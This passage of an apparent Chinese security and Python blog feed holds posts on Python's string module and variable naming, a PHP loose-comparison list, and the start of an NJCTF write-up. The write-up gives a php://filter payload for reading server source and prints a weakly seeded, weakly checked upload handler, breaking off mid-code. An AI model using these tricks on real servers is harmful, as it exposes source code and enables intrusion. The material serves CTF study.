class=&quot;string&quot;&gt;&#39;abc&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;123a&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;0x01&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;0e123456789&#39;&lt;/span&gt; == &lt;span class=&quot;string&quot;&gt;&#39;0e987654321&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;] == [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] == [&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;] == [&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>string标准库源码学习</title>
    <link href="http://yoursite.com/2017/03/29/string%E6%A0%87%E5%87%86%E5%BA%93%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/03/29/string标准库源码学习/</id>
    <published>2017-03-29T09:44:48.000Z</published>
    <updated>2017-03-30T08:16:38.483Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-Contents"><a href="#0x00-Contents" class="headerlink" title="0x00 Contents"></a>0x00 Contents</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">常量定义</div><div class="line"><span class="variable">_TemplateMetaclass</span></div><div class="line">maketrans</div><div class="line"><span class="variable">_multimap</span></div><div class="line">Template</div><div class="line">strop</div><div class="line">Fromatter</div></pre></td></tr></table></figure>
<h3 id="0x01-常量定义"><a href="#0x01-常量定义" class="headerlink" title="0x01 常量定义"></a>0x01 常量定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">whitespace = <span class="string">' \t\n\r\v\f'</span>   空白字符  \t制表符  \n换行</div><div class="line">ascii_lowercase = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">ascii_uppercase = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line">ascii_letters = ascii_lowercase + ascii_uppercase</div><div class="line">digits = <span class="string">'0123456789'</span>   十进制</div><div class="line">hexdigits = digits + <span class="string">'abcdef'</span> + <span class="string">'ABCDEF'</span>  十六进制</div><div class="line">octdigits = <span class="string">'01234567'</span>   八进制</div><div class="line">punctuation = <span class="string">r"""!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~"""</span>  <span class="comment">#标点符号</span></div><div class="line">printable = digits + ascii_letters + punctuation + whitespace</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>代码上来就是一系列常用的常量定义，知道就行，以后需要用到直接用（比如生成随机字符串，和random配合使用）</p>
<h3 id="0x02-TemplateMetaclass"><a href="#0x02-TemplateMetaclass" class="headerlink" title="0x02 _TemplateMetaclass"></a>0x02 _TemplateMetaclass</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_TemplateMetaclass</span><span class="params">(type)</span>:</span></div><div class="line">    pattern = <span class="string">r"""</span></div><div class="line">    %(delim)s(?:</div><div class="line">      (?P&lt;escaped&gt;%(delim)s) |   # Escape sequence of two delimiters</div><div class="line">      (?P&lt;named&gt;%(id)s)      |   # delimiter and a Python identifier</div><div class="line">      &#123;(?P&lt;braced&gt;%(id)s)&#125;   |   # delimiter and a braced identifier</div><div class="line">      (?P&lt;invalid&gt;)              # Other ill-formed delimiter exprs</div><div class="line">    )</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(cls, name, bases, dct)</span>:</span></div><div class="line">        super(_TemplateMetaclass, cls).__init__(name, bases, dct)</div><div class="line">        <span class="keyword">if</span> <span class="string">'pattern'</span> <span class="keyword">in</span> dct:</div><div class="line">            pattern = cls.pattern</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pattern = _TemplateMetaclass.pattern % &#123;</div><div class="line">                <span class="string">'delim'</span> : _re.escape(cls.delimiter),</div><div class="line">                <span class="string">'id'</span>    : cls.idpattern,</div><div class="line">                &#125;</div><div class="line">        cls.pattern = _re.compile(pattern, cls.flags | _re.VERBOSE)</div></pre></td></tr></table></figure>
<p>_TemplateMetaclass是一个元类，它提供了一个核心功能：</p>
<blockquote>
<p>通过创建出来的类，都有一个pattern属性</p>
<p>该属性能够解析类似于 delimiter{idpattern} 或者 delimiteridpattern的字符串。通过 它创建出来的类，只需要定制delimiter和idpatten的具体值就可拥有以上的功能</p>
<p>如果通过它创建出来的类，也可以自己提供pattern(但最终使用的时候，会被元类自动换成re对象)</p>
<h3 id="0x03-Template"><a href="#0x03-Template" class="headerlink" title="0x03 Template"></a>0x03 Template</h3></blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span><span class="params">(metaclass=_TemplateMetaclass)</span>:</span></div><div class="line">    <span class="string">"""A string class for supporting $-substitutions."""</span></div><div class="line">    <span class="string">"""能够解析$表达式的字符串模板类"""</span></div><div class="line">    </div><div class="line">    delimiter = <span class="string">'$'</span></div><div class="line">    idpattern = <span class="string">r'[_a-z][_a-z0-9]*'</span></div><div class="line">    flags = _re.IGNORECASE</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, template)</span>:</span></div><div class="line">        self.template = template</div><div class="line"></div><div class="line">    <span class="comment"># Search for $$, $identifier, $&#123;identifier&#125;, and any bare $'s</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_invalid</span><span class="params">(self, mo)</span>:</span></div><div class="line">    </div><div class="line">    <span class="string">"""如果解析到无效的占位符，就告诉调用者在及航机类出错"""</span></div><div class="line">    </div><div class="line">        i = mo.start(<span class="string">'invalid'</span>)</div><div class="line">        lines = self.template[:i].splitlines(keepends=<span class="keyword">True</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lines:</div><div class="line">            colno = <span class="number">1</span></div><div class="line">            lineno = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            colno = i - len(<span class="string">''</span>.join(lines[:<span class="number">-1</span>]))</div><div class="line">            lineno = len(lines)</div><div class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'Invalid placeholder in string: line %d, col %d'</span> %</div><div class="line">                         (lineno, colno))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(*args, **kws)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">"descriptor 'substitute' of 'Template' object "</span></div><div class="line">                            <span class="string">"needs an argument"</span>)</div><div class="line">        self, *args = args  <span class="comment"># allow the "self" keyword be passed</span></div><div class="line">        <span class="keyword">if</span> len(args) &gt; <span class="number">1</span>:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Too many positional arguments'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            mapping = kws</div><div class="line">        <span class="keyword">elif</span> kws:</div><div class="line">            mapping = _ChainMap(kws, args[<span class="number">0</span>])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            mapping = args[<span class="number">0</span>]</div><div class="line">        <span class="comment"># Helper function for .sub()</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(mo)</span>:</span></div><div class="line">            <span class="comment"># Check the most common path first.</span></div><div class="line">            named = mo.group(<span class="string">'named'</span>) <span class="keyword">or</span> mo.group(<span class="string">'braced'</span>)</div><div class="line">            <span class="keyword">if</span> named <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> str(mapping[named])</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'escaped'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> self.delimiter</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'invalid'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                self._invalid(mo)</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'Unrecognized named group in pattern'</span>,</div><div class="line">                             self.pattern)</div><div class="line">        <span class="keyword">return</span> self.pattern.sub(convert, self.template)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_substitute</span><span class="params">(*args, **kws)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">"descriptor 'safe_substitute' of 'Template' object "</span></div><div class="line">                            <span class="string">"needs an argument"</span>)</div><div class="line">        self, *args = args  <span class="comment"># allow the "self" keyword be passed</span></div><div class="line">        <span class="keyword">if</span> len(args) &gt; <span class="number">1</span>:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Too many positional arguments'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            mapping = kws</div><div class="line">        <span class="keyword">elif</span> kws:</div><div class="line">            mapping = _ChainMap(kws, args[<span class="number">0</span>])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            mapping = args[<span class="number">0</span>]</div><div class="line">        <span class="comment"># Helper function for .sub()</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(mo)</span>:</span></div><div class="line">            named = mo.group(<span class="string">'named'</span>) <span class="keyword">or</span> mo.group(<span class="string">'braced'</span>)</div><div class="line">            <span class="keyword">if</span> named <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">return</span> str(mapping[named])</div><div class="line">                <span class="keyword">except</span> KeyError:</div><div class="line">                    <span class="keyword">return</span> mo.group()</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'escaped'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> self.delimiter</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'invalid'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> mo.group()</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'Unrecognized named group in pattern'</span>,</div><div class="line">                             self.pattern)</div><div class="line">        <span class="keyword">return</span> self.pattern.sub(convert, self.template)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-Contents&quot;&gt;&lt;a href=&quot;#0x00-Contents&quot; class=&quot;headerlink&quot; title=&quot;0x00 Contents&quot;&gt;&lt;/a&gt;0x00 Contents&lt;/h3&gt;&lt;figure class=&quot;highlight sqf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;常量定义&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;_TemplateMetaclass&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;maketrans&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;_multimap&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Template&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;strop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Fromatter&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0x01-常量定义&quot;&gt;&lt;a href=&quot;#0x01-常量定义&quot; class=&quot;headerlink&quot; title=&quot;0x01 常量定义&quot;&gt;&lt;/a&gt;0x01 常量定义&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;whitespace = &lt;span class=&quot;string&quot;&gt;&#39; \t\n\r\v\f&#39;&lt;/span&gt;   空白字符  \t制表符  \n换行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ascii_lowercase = &lt;span class=&quot;string&quot;&gt;&#39;abcdefghijklmnopqrstuvwxyz&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ascii_uppercase = &lt;span class=&quot;string&quot;&gt;&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ascii_letters = ascii_lowercase + ascii_uppercase&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;digits = &lt;span class=&quot;string&quot;&gt;&#39;0123456789&#39;&lt;/span&gt;   十进制&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hexdigits = digits + &lt;span class=&quot;string&quot;&gt;&#39;abcdef&#39;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&#39;ABCDEF&#39;&lt;/span&gt;  十六进制&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;octdigits = &lt;span class=&quot;string&quot;&gt;&#39;01234567&#39;&lt;/span&gt;   八进制&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;punctuation = &lt;span class=&quot;string&quot;&gt;r&quot;&quot;&quot;!&quot;#$%&amp;amp;&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`&amp;#123;|&amp;#125;~&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#标点符号&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;printable = digits + ascii_letters + punctuation + whitespace&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python变量命名规则</title>
    <link href="http://yoursite.com/2017/03/29/python%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99/"/>
    <id>http://yoursite.com/2017/03/29/python变量命名规则/</id>
    <published>2017-03-29T08:43:25.000Z</published>
    <updated>2017-03-30T09:23:14.514Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">最近在读requests模块的源码，好的代码读起来让人心旷神怡。回想之前写的代码变量命名也是胡写一通。决定好好总结一番，并在以后的书写留意。虽然电脑并不会再议变量的名称，但值得在意的是，好的命名，能使你的程序更有可读性。</div></pre></td></tr></table></figure>
<h3 id="0x01-全局变量名（类变量，在java中相当于static变量）"><a href="#0x01-全局变量名（类变量，在java中相当于static变量）" class="headerlink" title="0x01 全局变量名（类变量，在java中相当于static变量）"></a>0x01 全局变量名（类变量，在java中相当于static变量）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">大写字母，单词之间用_分割</div><div class="line">NUMBER</div><div class="line">COLOR_WRITE</div><div class="line">对于from M import *导入语句，如果想阻止导入模块内的全局变量可以使用旧有的规范，在全局变量上加一个前导的下划线。</div><div class="line"></div><div class="line"><span class="comment">&lt;!-- more --&gt;</span></div><div class="line">*注意*:应避免使用全局变量</div></pre></td></tr></table></figure>
<h3 id="0x02-普通变量"><a href="#0x02-普通变量" class="headerlink" title="0x02 普通变量"></a>0x02 普通变量</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">小写字母，单词之间用_分割</div><div class="line">this_is_a_var</div><div class="line"></div><div class="line">*注意*：</div><div class="line"></div><div class="line"><span class="number">1.</span>不论是类成员变量还是全局变量，均不使用 m 或 g 前缀。</div><div class="line"></div><div class="line"><span class="number">2.</span>私有类成员使用单一下划线前缀标识，多定义公开成员，少定义私有成员。</div><div class="line"></div><div class="line"><span class="number">3.</span>变量名不应带有类型信息，因为Python是动态类型语言。如 iValue、names_list、dict_obj 等都是不好的命名。</div></pre></td></tr></table></figure>
<h3 id="0x03-实例变量"><a href="#0x03-实例变量" class="headerlink" title="0x03 实例变量"></a>0x03 实例变量</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">以_开头，其他和普通变量一样</div><div class="line"><span class="variable">_price</span></div><div class="line"><span class="variable">_instance_var</span></div><div class="line"></div><div class="line">私有实例变量（外部访问会报错）：</div><div class="line">以<span class="variable">__</span>开头（<span class="number">2</span>个下划线），其他和普通变量一样</div><div class="line"><span class="variable">__private_var</span></div></pre></td></tr></table></figure>
<h3 id="0x04-专有变量"><a href="#0x04-专有变量" class="headerlink" title="0x04 专有变量"></a>0x04 专有变量</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">__</span>开头，<span class="variable">__</span>结尾，一般为python的自有变量，不要以这种方式命名</div><div class="line"><span class="variable">__doc__</span></div><div class="line"><span class="variable">__class__</span></div></pre></td></tr></table></figure>
<h3 id="0x05-未完待续"><a href="#0x05-未完待续" class="headerlink" title="0x05 未完待续"></a>0x05 未完待续</h3><p><a href="http://www.voidcn.com/blog/wenxxxxx/article/p-1041297.html" target="_blank" rel="external">参考链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>NJCTF-Geuess</title>
    <link href="http://yoursite.com/2017/03/16/NJCTF-Geuess/"/>
    <id>http://yoursite.com/2017/03/16/NJCTF-Geuess/</id>
    <published>2017-03-16T05:40:17.000Z</published>
    <updated>2017-03-30T08:17:41.148Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-获取源码"><a href="#0x01-获取源码" class="headerlink" title="0x01 获取源码"></a>0x01 获取源码</h3><p>利用php的协议php://filter获取源码，具体方法：<code>php://filter/convert.base64-encode/resource=upload</code>，读到源码，然后base64解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></div><div class="line">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></div><div class="line">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></div><div class="line">&#123;</div><div class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);<span class="comment">//61</span></div><div class="line">    $str = <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">        $str .= $set[$ch];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"$ch"</span>;</div><div class="line">    <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line">session_start();</div><div class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line"></div><div class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">    mt_srand($seed);</div><div class="line">    $ss = mt_rand();</div><div class="line">    $hash = md5(session_id() . $ss);</div><div class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</div><div class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</div><div class="line">    &#125;</div><div class="line">    $check1 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</div><div class="line">    $check2=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</div><div 